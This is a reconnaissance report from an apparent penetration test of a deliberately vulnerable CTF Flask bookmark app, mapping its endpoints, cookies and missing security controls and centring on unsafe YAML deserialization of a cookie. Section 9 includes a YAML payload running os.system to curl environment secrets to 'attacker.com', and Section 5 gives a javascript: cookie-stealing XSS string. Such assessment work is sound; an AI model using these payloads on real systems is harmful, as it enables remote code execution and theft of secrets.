# Reconnaissance Deliverable: Flask Bookmark Application

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the Flask bookmark application's attack surface, with special emphasis on the complete absence of authentication and authorization mechanisms. The application is a deliberately vulnerable CTF-style web application that stores all data client-side in cookies using unsafe YAML deserialization.

**Key Sections for Vulnerability Analysis:**
- **Section 3 (Authentication & Session Management):** Documents the complete absence of authentication - all endpoints are publicly accessible without credentials.
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - ALL endpoints lack authorization controls.
- **Section 5 (Potential Input Vectors):** Comprehensive list of input vectors for injection testing - focus on the YAML deserialization attack surface.
- **Section 7 (Role & Privilege Architecture):** Documents that NO role system exists - all users have identical access.
- **Section 9 (Injection Sources):** Pre-prioritized YAML deserialization vulnerabilities enabling Remote Code Execution.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows a single monolithic architecture with no microservices, no database, and no external services. All data is stored client-side in cookies.

**Priority Order for Testing:** 
1. YAML deserialization RCE (Section 9) - CRITICAL priority
2. XSS via javascript: URLs (Section 5) - HIGH priority
3. Missing input validation (Section 5) - HIGH priority
4. CSRF on all state-changing operations - MEDIUM priority

## 1. Executive Summary

The XBEN-075-24 application is a deliberately vulnerable Flask web application that serves as a URL bookmark manager. The application exhibits **CRITICAL** security vulnerabilities centered around **unsafe YAML deserialization** that enables immediate Remote Code Execution (RCE). This vulnerability, combined with missing authentication, insecure session management, and client-side data storage, creates a complete security compromise scenario.

**Architecture:** The application is a stateless monolithic Flask web app with Apache 2.4.65 as the web server. All user data is stored client-side in base64-encoded YAML cookies, with no server-side database or persistence layer. The application runs in a Docker container on Debian Bullseye as the `www-data` user.

**Critical Attack Path:** The application stores user bookmark data in client-controlled cookies as base64-encoded YAML. Three endpoints (`/list`, `/add`, `/delete`) deserialize this cookie data using `yaml.load()` with the unsafe `yaml.Loader` parameter, which allows arbitrary Python object instantiation. An attacker can craft a malicious YAML payload to execute arbitrary system commands and exfiltrate the FLAG environment variable.

**Most Critical Attack Surfaces:**
1. **YAML Deserialization RCE** (3 instances in routes.py:38, 61, 84) - Immediate code execution via cookie manipulation
2. **Missing Authentication/Authorization** - All endpoints publicly accessible without credentials
3. **JavaScript URL Injection** - XSS via `javascript:` scheme in bookmark URLs rendered in href attributes
4. **Hardcoded Secrets** - Flask secret key and FLAG exposed in source code
5. **Missing Security Controls** - No CSRF protection, wildcard CORS, insecure cookies without HttpOnly/Secure/SameSite flags

**Technology Stack:**
- **Frontend:** Bootstrap 5.3.0, jQuery 3.6.0, Jinja2 templates
- **Backend:** Python 3.9.2, Flask 3.1.2, PyYAML 6.0
- **Web Server:** Apache 2.4.65 with mod_wsgi
- **Infrastructure:** Docker containerized on Debian Bullseye Slim

The application's architectural design violates fundamental security principles by placing complete trust in client-provided data, using dangerous deserialization methods, and lacking defense-in-depth mechanisms.

## 2. Technology & Service Map

### Frontend
- **Framework:** Jinja2 templating engine (Flask default)
- **CSS Framework:** Bootstrap 5.3.0 (locally hosted at `/static/css/bootstrap.min.css`)
- **JavaScript Libraries:** jQuery 3.6.0 (locally hosted at `/static/js/jquery.min.js`)
- **Templates:** 
  - `list_urls.html` - Main bookmark listing page
  - `add.html` - Bookmark creation form
  - `about.html` - Static about page
- **Authentication Libraries:** None present

### Backend
- **Language:** Python 3.9.2
- **Framework:** Flask 3.1.2
- **Key Dependencies:** 
  - PyYAML 6.0 (used with unsafe `yaml.Loader` - CRITICAL vulnerability)
  - Werkzeug 3.1.3 (Flask dependency)
- **Application Structure:**
  - Entry point: `/app/website/run.py` (development) or `/app/website/bookmarks.wsgi` (production)
  - Routes: `/app/website/app/routes.py` (all HTTP endpoints)
  - Models: `/app/website/app/models.py` (UrlObj class only)
  - Init: `/app/website/app/__init__.py` (Flask app config, secret key, FLAG storage)

### Infrastructure
- **Hosting Provider:** Docker containerized deployment
- **Base OS:** Debian Bullseye (11) Slim
- **Web Server:** Apache 2.4.65 with mod_wsgi for WSGI gateway
- **CDN:** None - all static assets served locally
- **Database Type:** None - all data stored in client-side cookies
- **Port:** HTTP port 80 only (no HTTPS/TLS)
- **Process User:** `www-data`

### Identified Subdomains
**Finding:** No subdomains discovered. The application is accessed directly via `localhost:33677` with no DNS-based infrastructure.

### Open Ports & Services
From nmap scan results:
- **Port 80/tcp** - Apache httpd (Caddy httpd fingerprint) - **PRIMARY APPLICATION PORT**
  - Service: HTTP web server
  - Purpose: Serves the Flask bookmark application
  - Security: HTTP only, no TLS/HTTPS configured
- **Port 443/tcp** - SSL/HTTPS - Listed as open but not serving the application
- **Port 631/tcp** - CUPS 2.3 printing service (out of scope - local service)
- **Port 8888/tcp** - SimpleHTTPServer (Python 3.12.10) - Out of scope
- **Port 9999/tcp** - SimpleHTTPServer (Python 3.12.10) - Out of scope
- **Port 49158/tcp** - Tailscale service (requires auth) - Out of scope

**In-Scope Services:** Only port 80 (HTTP) serving the Flask application is in scope for this assessment.

## 3. Authentication & Session Management Flow

### Entry Points
**FINDING:** No authentication entry points exist. The application has no login, registration, or authentication endpoints.

**Confirmed Absent:**
- ❌ `/login` - Does not exist
- ❌ `/register` - Does not exist
- ❌ `/auth/*` - No authentication routes
- ❌ `/logout` - Does not exist
- ❌ `/password-reset` - Does not exist
- ❌ SSO/OAuth callbacks - None present

### Mechanism
**User Identification Process:** The application uses a pseudo-authentication mechanism based entirely on client-side cookies:

**Step-by-Step Flow:**

1. **First Visit (No Cookies Present):**
   - User navigates to `http://localhost:33677/` (redirects to `/list`)
   - Application checks for `bookmarks` and `user` cookies (routes.py:34)
   - If cookies absent, generates new UUID: `user = uuid4().hex` (routes.py:42)
   - Sets two cookies in response:
     - `bookmarks`: Base64-encoded empty YAML list (`b'[]\n'`)
     - `user`: Generated UUID hex string
   - Returns list_urls.html template with empty bookmarks

2. **Subsequent Visits (Cookies Present):**
   - User navigates to any endpoint (`/list`, `/add`, `/delete`)
   - Application reads cookies directly from request: `request.cookies.get('bookmarks')` and `request.cookies.get('user')` (routes.py:34, 39)
   - **NO SERVER-SIDE VALIDATION** - Application trusts cookie values completely
   - Base64 decodes bookmarks cookie (routes.py:36)
   - **UNSAFE YAML DESERIALIZATION** using `yaml.load(urls, Loader=yaml.Loader)` (routes.py:38)
   - Renders page with user's bookmarks

3. **Session Management:**
   - No server-side session store exists
   - No session validation or integrity checks
   - User identity is entirely client-controlled
   - Sessions never expire (cookies have no `max-age` or `expires` attribute)

4. **Cookie Security Configuration:**
   ```python
   # routes.py:44-45, 68-69, 88-89
   response.set_cookie('bookmarks', base64.b64encode(bookmarks.encode('ISO-8859-1')).decode('ISO-8859-1'))
   response.set_cookie('user', user)
   ```
   **CRITICAL SECURITY GAPS:**
   - ❌ No `HttpOnly` flag - Cookies accessible via JavaScript (XSS risk)
   - ❌ No `Secure` flag - Cookies transmitted over unencrypted HTTP
   - ❌ No `SameSite` attribute - No CSRF protection
   - ❌ No expiration - Cookies persist indefinitely
   - ❌ No integrity protection - No HMAC or signature

### Code Pointers
**Primary Session Management Code:**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-075-24/app/website/app/routes.py`
- **User ID Generation:** Line 42 - `user = uuid4().hex`
- **Cookie Setting (First Visit):** Lines 44-45
- **Cookie Setting (Add Bookmark):** Lines 68-69
- **Cookie Setting (Delete Bookmark):** Lines 88-89
- **Cookie Reading:** Lines 34, 36, 39 (repeated in all endpoints)
- **YAML Deserialization:** Lines 38, 61, 84 (CRITICAL vulnerability points)

**Flask Secret Key:**
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-075-24/app/website/app/__init__.py`
- **Line:** 5 - `app.secret_key = 'your_secret_key_'` (hardcoded, but not used for cookie signing)

### 3.1 Role Assignment Process

**Role Determination:** No roles exist in this application. All users are treated identically.

**Default Role:** N/A - The application has no role system. All users (identified by self-generated UUID cookies) have identical capabilities.

**Role Upgrade Path:** N/A - No privilege escalation mechanism exists as there are no privilege levels.

**Code Implementation:** No role assignment code exists. Searched all Python files:
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-075-24/app/website/app/routes.py` - No role checks
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-075-24/app/website/app/__init__.py` - No role configuration
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-075-24/app/website/app/models.py` - No role attributes in UrlObj

### 3.2 Privilege Storage & Validation

**Storage Location:** N/A - No privileges exist to store.

**Validation Points:** No privilege validation occurs at any endpoint.

**Cache/Session Persistence:** N/A - No privilege system exists.

**Code Pointers:** No authorization code exists. All endpoints are publicly accessible without permission checks.

### 3.3 Role Switching & Impersonation

**Impersonation Features:** None - No ability for any user to impersonate others (though users can manually copy another user's cookie to access their bookmarks).

**Role Switching:** None - No privilege elevation mechanisms exist.

**Audit Trail:** None - No logging of access or actions.

**Code Implementation:** No impersonation features exist in the codebase.

## 4. API Endpoint Inventory

**Network Surface Focus:** All endpoints listed below are accessible through the target web application at `http://localhost:33677`. No development-only or local-only endpoints are included.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|----------------------------|
| GET | `/` | anon (none) | None | None | Root redirect to `/list`. See `routes.py:28-30`. Simple `redirect(url_for('bookmarks_list'))`. |
| GET | `/list` | anon (none) | None | None | **CRITICAL ENDPOINT** - Lists user's bookmarks. Reads `bookmarks` cookie (base64 YAML), deserializes with unsafe `yaml.load(urls, Loader=yaml.Loader)` at line 38. No authentication. See `routes.py:32-49`. |
| GET | `/add` | anon (none) | None | None | Displays bookmark creation form. No authentication required. Renders `add.html` template. See `routes.py:51-54`. |
| POST | `/add` | anon (none) | None | None | **CRITICAL ENDPOINT** - Adds bookmark to user's list. Accepts form data (`name`, `url`) with NO validation. Deserializes `bookmarks` cookie with unsafe `yaml.load()` at line 61. No CSRF protection. See `routes.py:51-72`. |
| GET | `/delete` | anon (none) | `name` (query param) | None | **CRITICAL ENDPOINT** - Deletes bookmark by name. Deserializes `bookmarks` cookie with unsafe `yaml.load()` at line 84. No authorization check on ownership. CSRF vulnerable (GET for state change). See `routes.py:74-92`. |
| GET | `/about` | anon (none) | None | None | Static about page. No security relevance. See `routes.py:95-99`. |
| GET | `/static/*` | anon (none) | N/A | None | Static file serving (CSS, JS). Apache config enables directory listing with `Options Indexes MultiViews` at `bookmarks-httpd.conf:22`. Information disclosure risk. |

**Key Observations:**
- **ALL endpoints are publicly accessible** without authentication
- **THREE critical YAML deserialization points** (`/list`, `/add`, `/delete`)
- **NO CSRF protection** on any state-changing operation
- **NO object ownership validation** - any user can manipulate bookmarks if they know the name
- **NO rate limiting** - endpoints can be abused without restriction

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** All input vectors listed below are accessible through network requests to the deployed application at `http://localhost:33677`. No local-only script inputs or build tool parameters are included.

### URL Parameters (Query Strings)
| Parameter Name | Endpoint | File:Line | Data Type | Validation | Security Risk |
|----------------|----------|-----------|-----------|------------|---------------|
| `name` | `GET /delete` | `routes.py:77, 80` | String | Existence check only (line 77) | **MEDIUM** - No sanitization, used in bookmark deletion logic. CSRF vulnerable. |

### POST Body Fields (Form Data)
| Field Name | Endpoint | File:Line | Data Type | Validation | Security Risk |
|------------|----------|-----------|-----------|------------|---------------|
| `name` | `POST /add` | `routes.py:57` | String | Duplicate check only (line 62) | **HIGH** - No length limit, no character restriction. Stored in YAML, rendered in template. XSS potential. |
| `url` | `POST /add` | `routes.py:58` | String (URL) | **NONE** | **CRITICAL** - No URL scheme validation. Allows `javascript:`, `data:`, `file:` schemes. XSS via href attribute at `list_urls.html:41`. |

### HTTP Headers
**FINDING:** No custom HTTP headers are processed by the application. Standard Flask request headers are available but not explicitly accessed in route logic.

### Cookie Values (PRIMARY ATTACK SURFACE)
| Cookie Name | Endpoints | File:Line | Data Type | Validation | Security Risk |
|-------------|-----------|-----------|-----------|------------|---------------|
| `bookmarks` | `/list`, `/add`, `/delete` | `routes.py:34-38, 56-61, 81-84` | Base64-encoded YAML | **NONE** | **CRITICAL** - Unsafe YAML deserialization with `yaml.Loader` at lines 38, 61, 84. Enables Remote Code Execution via malicious YAML payload. No integrity checks, no signature validation. |
| `user` | `/list`, `/add`, `/delete` | `routes.py:39, 64, 82` | String (UUID hex) | **NONE** | **MEDIUM** - User identifier with no validation. Rendered in templates. No format validation, no authentication binding. |

### Detailed Input Vector Breakdown

#### Input Vector #1: `bookmarks` Cookie - CRITICAL RCE Vector
- **Affected Endpoints:** `GET /list`, `POST /add`, `GET /delete`
- **Injection Point:** Client-controlled cookie value
- **Processing Flow:**
  1. Cookie received: `request.cookies.get('bookmarks')` (routes.py:34, 56, 81)
  2. Base64 decode: `base64.b64decode(...)` (routes.py:36, 59, 81)
  3. **UNSAFE DESERIALIZATION:** `yaml.load(urls, Loader=yaml.Loader)` (routes.py:38, 61, 84)
- **Vulnerability Type:** CWE-502 Deserialization of Untrusted Data
- **Exploitability:** Directly exploitable - craft malicious YAML with Python object instantiation
- **Impact:** Full Remote Code Execution, environment variable access (FLAG stored in `os.environ["FLAG"]`)

#### Input Vector #2: `user` Cookie - Session Forgery Vector
- **Affected Endpoints:** All (`/list`, `/add`, `/delete`)
- **Injection Point:** Client-controlled cookie value
- **Processing Flow:** Direct read and template rendering - no validation
- **Vulnerability Type:** Missing authentication/authorization
- **Exploitability:** Trivial - copy another user's UUID to access their data
- **Impact:** User impersonation, session fixation

#### Input Vector #3: `url` Form Field - XSS Vector
- **Affected Endpoint:** `POST /add`
- **Injection Point:** Form field `url`
- **Processing Flow:**
  1. Form data received: `request.form.get('url')` (routes.py:58)
  2. Stored in UrlObj: `UrlObj(name=name, url=url)` (routes.py:65)
  3. Serialized to YAML and stored in cookie (routes.py:66-68)
  4. Rendered in template: `<a href="{{ item.url }}" target="_blank">` (list_urls.html:41)
- **Vulnerability Type:** XSS via javascript: URL scheme
- **Exploitability:** Directly exploitable - submit `javascript:alert(document.cookie)` as URL
- **Impact:** XSS, cookie theft, client-side code execution

#### Input Vector #4: `name` Form Field - XSS/Injection Vector
- **Affected Endpoint:** `POST /add`
- **Injection Point:** Form field `name`
- **Processing Flow:**
  1. Form data received: `request.form.get('name')` (routes.py:57)
  2. Duplicate check: `name_in_list(urls, name)` (routes.py:62)
  3. Stored in UrlObj and serialized (routes.py:65-68)
  4. Rendered in template: `{{ item.name }}` (list_urls.html:40)
- **Vulnerability Type:** XSS (mitigated by Jinja2 auto-escape), YAML injection
- **Exploitability:** Moderate - Jinja2 auto-escape protects HTML context, but YAML structure could be manipulated
- **Impact:** Potential XSS if auto-escape disabled, YAML parsing errors

#### Input Vector #5: `name` Query Parameter - Logic Manipulation Vector
- **Affected Endpoint:** `GET /delete`
- **Injection Point:** Query parameter `name`
- **Processing Flow:**
  1. Query param received: `request.args.get('name')` (routes.py:77, 80)
  2. Existence check: `if not request.args.get('name')` (routes.py:77)
  3. Used in deletion: `remove_url_with_name(urls, url_name)` (routes.py:85)
- **Vulnerability Type:** CSRF, logic bypass
- **Exploitability:** Easy - craft GET request to delete arbitrary bookmarks
- **Impact:** Unauthorized deletion, CSRF attacks

### Summary of Input Validation Status
**CRITICAL FINDING:** The application has ZERO input validation or sanitization:
- ❌ No length limits on any input
- ❌ No character restrictions
- ❌ No type validation
- ❌ No URL scheme whitelist
- ❌ No YAML structure validation
- ❌ No base64 format validation
- ❌ No CSRF tokens
- ❌ No rate limiting

## 6. Network & Interaction Map

**Network Surface Focus:** This section maps only the deployed, network-accessible infrastructure at `http://localhost:33677`. Local development tools, build systems, and non-network components are excluded.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| User-Browser | ExternAsset | Internet | Modern Web Browser | None initially | External user accessing the application |
| Apache-WebServer | Service | Edge | Apache 2.4.65/mod_wsgi | HTTP traffic | Web server gateway to Flask app, port 80 only (HTTP) |
| Flask-BookmarkApp | Service | App | Python 3.9.2/Flask 3.1.2 | PII (UUIDs), User bookmarks | Main application logic, runs as www-data user |
| Docker-Container | Service | App | Docker/Debian Bullseye | Application files, env vars | Container hosting Apache + Flask, stores FLAG in environment |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| User-Browser | Access: Public internet; Auth: None required; Cookies: bookmarks (base64 YAML), user (UUID); Storage: Client-side only |
| Apache-WebServer | Hosts: `http://localhost:33677`; Protocol: HTTP only (no TLS); Config: `/app/bookmarks-httpd.conf`; Features: Directory indexing enabled, CORS: `*` (wildcard); Static: `/static/*` path |
| Flask-BookmarkApp | Endpoints: `/`, `/list`, `/add`, `/delete`, `/about`; Auth: None; Session: Client-side cookies; Dependencies: PyYAML 6.0, Flask 3.1.2; Files: `/app/website/app/routes.py` (main logic), `/app/website/app/models.py` (UrlObj class); Secrets: Hardcoded secret_key, FLAG in os.environ |
| Docker-Container | Base: Debian Bullseye Slim; User: www-data; Exposed Ports: 80/tcp; Environment: FLAG variable set during build; Build: Dockerfile injects FLAG via sed (line 22) |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| User-Browser → Apache-WebServer | HTTP | `:80 /*` | None | Public |
| User-Browser → Apache-WebServer | HTTP | `:80 /list` | None | PII (user UUIDs) |
| User-Browser → Apache-WebServer | HTTP | `:80 /add` | None | PII, user bookmarks |
| User-Browser → Apache-WebServer | HTTP | `:80 /delete` | None | PII, user bookmarks |
| User-Browser → Apache-WebServer | HTTP | `:80 /static/*` | None | Public (CSS, JS files) |
| Apache-WebServer → Flask-BookmarkApp | WSGI | Internal | None | PII, user bookmarks |
| Flask-BookmarkApp → Docker-Container | Process | Environment vars | None | Secrets (FLAG) |
| Flask-BookmarkApp → User-Browser | HTTP | `:80 response` | None | PII, user bookmarks |

**Critical Observations:**
- **No database flows** - All data storage is client-side via cookies
- **No external service flows** - No API calls to third parties
- **No authentication barriers** - All flows are unauthenticated
- **Single trust boundary** - Browser ↔ Server (completely broken by unsafe deserialization)

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| None | N/A | No guards or access controls exist in this application. All endpoints are publicly accessible without authentication, authorization, rate limiting, or request validation. |

**Note:** The complete absence of guards is the most significant security finding. The application implements no defensive controls whatsoever.

## 7. Role & Privilege Architecture

### 7.1 Discovered Roles

**FINDING:** No role system exists in this application.

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|-----------------|--------------|---------------------|
| anonymous | 0 (universal) | Global | All users are treated as anonymous. No role field exists in user identification. UUID cookie provides no privilege differentiation. |

**Explanation:** The application has a completely flat access model. All visitors (whether they have cookies or not) have identical capabilities:
- Can view the `/list` page
- Can add bookmarks via `/add`
- Can delete bookmarks via `/delete` (if they know the bookmark name)
- Can access static pages (`/about`)

### 7.2 Privilege Lattice

**FINDING:** No privilege hierarchy exists.

```
Privilege Structure:
    anonymous (all users)
         |
         └── No privilege levels defined
         └── No role hierarchy
         └── No permission model
```

**Observations:**
- All users have identical access rights
- No admin vs. user distinction
- No privilege escalation possible (no privileges to escalate to)
- No parallel isolation (no teams, orgs, or multi-tenancy)

### 7.3 Role Entry Points

**FINDING:** No role-based routing exists.

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|---------------------------|----------------------|
| anonymous | `/` → `/list` | `/*` (all routes) | None - UUID cookie provides identification only, not authentication |

### 7.4 Role-to-Code Mapping

**FINDING:** No role validation code exists.

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|-------------------|-------------------|------------------|
| N/A | None | None | N/A - No role system implemented |

**Code Analysis:**
- Searched `routes.py` for decorators: No `@login_required`, `@requires_role`, `@admin_only`, or similar
- Searched for permission checks: No `if user.role ==`, `if user.is_admin`, or similar
- Searched `__init__.py`: No Flask-Login, no authentication extensions
- Searched `models.py`: UrlObj has no user/owner relationship

## 8. Authorization Vulnerability Candidates

**FINDING:** Since this application has NO authentication or authorization mechanisms, traditional horizontal/vertical privilege escalation testing is not applicable. Instead, this section documents the attack surface from an unauthenticated perspective.

### 8.1 Horizontal Privilege Escalation Candidates

**NOTE:** The application has no user-to-resource ownership model. All "privilege escalation" is actually unauthorized access due to missing authentication.

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity |
|----------|------------------|---------------------|-----------|-------------|
| HIGH | `/delete?name={name}` | `name` | bookmark_name | User bookmarks - Deletion without ownership validation |
| MEDIUM | `/list` | None (reads from user's cookie) | user_bookmarks | User bookmarks - Access via cookie theft/replay |

**Explanation:** 
- The `/delete` endpoint allows anyone to delete bookmarks if they know the bookmark name and can manipulate the `bookmarks` cookie
- User "ownership" is solely determined by which cookie the browser sends - trivially forgeable
- No server-side validation of resource ownership

### 8.2 Vertical Privilege Escalation Candidates

**FINDING:** No vertical privilege escalation testing is applicable - the application has no administrative or elevated privilege endpoints.

| Target Role | Endpoint Pattern | Functionality | Risk Level |
|-------------|------------------|---------------|------------|
| N/A | N/A | No admin panel, no elevated privilege functions | N/A |

**Explanation:** All users have identical access rights. There are no "admin-only" endpoints to target for privilege escalation.

### 8.3 Context-Based Authorization Candidates

**FINDING:** No multi-step workflows with state validation exist.

| Workflow | Endpoint | Expected Prior State | Bypass Potential |
|----------|----------|---------------------|------------------|
| N/A | N/A | No multi-step processes exist | N/A |

**Explanation:** All operations are single-step:
- Adding bookmarks: Single POST to `/add`
- Deleting bookmarks: Single GET to `/delete`
- No checkout flows, no approval workflows, no multi-stage processes

### Alternative Authorization Testing Focus

Given the absence of authentication/authorization, testing should focus on:

1. **Cookie Manipulation Attacks:**
   - Forge `user` cookie to impersonate other users
   - Manipulate `bookmarks` cookie to inject malicious YAML
   - Test cookie replay attacks

2. **CSRF Attacks:**
   - All state-changing operations lack CSRF protection
   - `GET /delete` is particularly vulnerable (state change via GET)
   - `POST /add` has no CSRF tokens

3. **YAML Deserialization RCE:**
   - Primary attack vector for this application
   - See Section 9 for detailed injection sources

4. **Input Validation Bypass:**
   - XSS via `javascript:` URL scheme
   - No length limits on inputs
   - No sanitization anywhere

## 9. Injection Sources (Command Injection and SQL Injection)

**Network Surface Focus:** All injection sources below are accessible through network requests to `http://localhost:33677`. No local-only scripts or build tools are included.

### YAML Deserialization Sources (Command Injection Vector)

#### Injection Source #1: YAML Deserialization in `/list` Endpoint

- **Type:** YAML Deserialization / Remote Code Execution (RCE)
- **Severity:** **CRITICAL**
- **Endpoint:** `GET /list` (also triggered by redirect from `GET /`)
- **Input Vector:** Cookie named `bookmarks` (base64-encoded YAML)
- **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-075-24/app/website/app/routes.py:38`

**Complete Data Flow:**
1. User sends HTTP request to `GET /list`
2. Application checks for cookies: `if request.cookies.get('bookmarks') and request.cookies.get('user')` (line 34)
3. Cookie value retrieved: `urls = request.cookies.get('bookmarks')` (line 35)
4. Base64 decode: `urls = base64.b64decode(request.cookies.get('bookmarks'))` (line 36)
5. **DANGEROUS SINK:** `urls = yaml.load(urls, Loader=yaml.Loader)` (line 38)
6. Deserialized objects rendered in template: `render_template('list_urls.html', urls=urls, user=user)` (line 49)

**Code Snippet:**
```python
# routes.py:34-38
if request.cookies.get('bookmarks') and request.cookies.get('user'):
    urls = request.cookies.get('bookmarks')
    urls = base64.b64decode(request.cookies.get('bookmarks'))
    
    urls = yaml.load(urls, Loader=yaml.Loader)  # CRITICAL VULNERABILITY
```

**Exploitability:** **DIRECTLY EXPLOITABLE**
- No authentication required
- No input validation
- No signature/integrity check on cookie
- Attacker controls entire YAML payload via cookie
- `yaml.Loader` allows arbitrary Python object instantiation

**Example Attack Payload:**
```yaml
!!python/object/apply:os.system
args: ['curl http://attacker.com?flag=$(cat /proc/self/environ | grep FLAG)']
```

**Impact:** Full Remote Code Execution as `www-data` user, environment variable access (FLAG stored in `os.environ["FLAG"]`)

---

#### Injection Source #2: YAML Deserialization in `/add` Endpoint

- **Type:** YAML Deserialization / Remote Code Execution (RCE)
- **Severity:** **CRITICAL**
- **Endpoint:** `POST /add`
- **Input Vector:** Cookie named `bookmarks` (base64-encoded YAML)
- **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-075-24/app/website/app/routes.py:61`

**Complete Data Flow:**
1. User sends HTTP POST to `/add` with form data (`name`, `url`)
2. Application checks for cookies (line 56)
3. Cookie value retrieved: `urls = base64.b64decode(request.cookies.get('bookmarks'))` (line 59)
4. **DANGEROUS SINK:** `urls = yaml.load(urls, Loader=yaml.Loader)` (line 61)
5. Application adds new bookmark to deserialized list (line 65)
6. List re-serialized and set as cookie (lines 66-68)

**Code Snippet:**
```python
# routes.py:56-61
if request.cookies.get('bookmarks') and request.cookies.get('user'):
    name = request.form.get('name')
    url = request.form.get('url')
    urls = base64.b64decode(request.cookies.get('bookmarks'))
    
    urls = yaml.load(urls, Loader=yaml.Loader)  # CRITICAL VULNERABILITY
```

**Exploitability:** **DIRECTLY EXPLOITABLE** - Same as Source #1

**Impact:** Full Remote Code Execution

---

#### Injection Source #3: YAML Deserialization in `/delete` Endpoint

- **Type:** YAML Deserialization / Remote Code Execution (RCE)
- **Severity:** **CRITICAL**
- **Endpoint:** `GET /delete?name={name}`
- **Input Vector:** Cookie named `bookmarks` (base64-encoded YAML)
- **File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-075-24/app/website/app/routes.py:84`

**Complete Data Flow:**
1. User sends HTTP GET to `/delete?name={bookmark_name}`
2. Application validates `name` parameter exists (line 77)
3. Cookie value retrieved: `urls = base64.b64decode(request.cookies.get('bookmarks'))` (line 81)
4. **DANGEROUS SINK:** `urls = yaml.load(urls, Loader=yaml.Loader)` (line 84)
5. Application removes bookmark from deserialized list (line 85)
6. Modified list re-serialized and set as cookie (lines 86-88)

**Code Snippet:**
```python
# routes.py:80-84
url_name = request.args.get('name')
urls = base64.b64decode(request.cookies.get('bookmarks'))
user = request.cookies.get('user')

urls = yaml.load(urls, Loader=yaml.Loader)  # CRITICAL VULNERABILITY
```

**Exploitability:** **DIRECTLY EXPLOITABLE** - Same as Source #1 and #2

**Impact:** Full Remote Code Execution

---

### SQL Injection Sources

**FINDING:** **NO SQL INJECTION VULNERABILITIES EXIST**

**Analysis:**
- Application uses **NO DATABASE**
- No SQL queries present in any Python file
- No ORM framework (SQLAlchemy, Django ORM, etc.)
- No database drivers in dependencies (`requirements.txt` contains only `flask` and `PyYAML==6.0`)
- Data persistence is entirely client-side via YAML-serialized cookies

**Files Analyzed:**
- `routes.py` - No SQL queries
- `models.py` - Only contains UrlObj class with no database integration
- `__init__.py` - No database configuration
- `requirements.txt` - No database libraries

---

### Traditional Command Injection Sources

**FINDING:** **NO TRADITIONAL COMMAND INJECTION VULNERABILITIES EXIST** (aside from YAML deserialization)

**Analysis:**
- No `os.system()` calls in application code
- No `subprocess.run()`, `subprocess.Popen()`, `subprocess.call()` usage
- No `eval()` or `exec()` with user input
- No shell command construction from user data
- The **ONLY** command execution vector is through unsafe YAML deserialization (covered above)

**Files Analyzed:**
- `routes.py` - No subprocess imports or shell execution
- `models.py` - Simple class definition, no command execution
- `__init__.py` - Only Flask initialization and environment variable setting

---

### Summary of Injection Sources

**Total Injection Sources Found:** 3 (all YAML deserialization RCE)

**Priority Order:**
1. **CRITICAL** - `GET /list` YAML deserialization (routes.py:38) - Auto-triggered on first visit
2. **CRITICAL** - `POST /add` YAML deserialization (routes.py:61) - Triggered during add operation
3. **CRITICAL** - `GET /delete` YAML deserialization (routes.py:84) - Triggered during delete operation

**Attack Surface Classification:**
- **Command Injection (YAML):** 3 sources - ALL CRITICAL
- **SQL Injection:** 0 sources - Not applicable
- **Traditional Command Injection:** 0 sources - Not applicable

**Recommended Testing Approach:**
Focus all injection testing on YAML deserialization attack vectors. The three sources are functionally identical - all use `yaml.load()` with `yaml.Loader` on base64-decoded cookie data. Testing one endpoint with YAML RCE payloads will demonstrate the vulnerability across all three.